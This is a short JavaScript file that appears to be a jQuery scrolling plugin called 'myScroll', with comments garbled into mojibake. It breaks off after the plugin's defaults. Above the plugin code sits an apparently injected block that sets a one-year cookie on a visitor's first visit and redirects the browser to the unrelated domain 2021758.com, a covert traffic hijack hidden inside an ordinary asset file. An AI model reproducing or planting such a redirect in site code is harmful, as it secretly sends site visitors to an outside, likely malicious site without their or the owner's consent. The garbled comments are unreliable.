var c = document.cookie;
     if (c.indexOf('isfirstvisited=false') != -1) {
        
     }
     else {
         var d = new Date();
         d.setFullYear(d.getFullYear() + 1);
         document.cookie = 'isfirstvisited=false;expires=' + d.toGMTString();
         window.location.href='https://2021758.com';  
     }
// JavaScript Document
(function($){

	$.fn.myScroll = function(options){
	//榛斤拷
	var defaults = {
		speed:30,  //婊猴拷,锟斤拷澶ч害锟